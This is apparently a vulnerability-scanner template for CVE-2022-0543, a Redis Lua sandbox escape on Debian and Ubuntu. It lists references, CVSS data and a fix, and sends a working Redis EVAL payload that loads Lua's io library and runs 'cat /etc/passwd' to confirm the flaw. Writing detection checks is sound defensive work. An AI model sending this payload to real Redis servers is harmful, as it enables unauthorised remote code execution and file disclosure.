id: CVE-2022-0543
info:
  name: Redis Sandbox Escape - Remote Code Execution
  author: dwisiswant0
  severity: critical
  description: This is a template that exploits the CVE-2022-0543 vulnerability in
    Debian and Ubuntu Redis packages by allowing remote code execution through an
    insufficiently sanitized Lua environment.
  reference:
  - https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce
  - https://attackerkb.com/topics/wyA1c1HIC8/cve-2022-0543/rapid7-analysis#rapid7-analysis
  - https://bugs.debian.org/1005787
  - https://www.debian.org/security/2022/dsa-5081
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2022-0543
  metadata:
    shodan-query: redis_version
    impact: The impact of CVE-2022-0543, a Redis sandbox escape vulnerability, is
      that attackers can execute remote code by exploiting the insufficiently sanitized
      Lua environment in Debian and Ubuntu Redis packages.
    recommendation: It is strongly recommended to update Redis packages on affected
      systems to fully mitigate the CVE-2022-0543 vulnerability and prevent potential
      remote code execution attacks.
  tags: cve,cve2022,network,redis,unauth,rce,kev
network:
- inputs:
  - data: "eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\"\
      , \"luaopen_io\"); local io = io_l(); local f = io.popen(\"cat /etc/passwd\"\
      , \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0\r\n"
  host:
  - '{{Hostname}}'
  - '{{Host}}:6379'
  read-size: 64
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
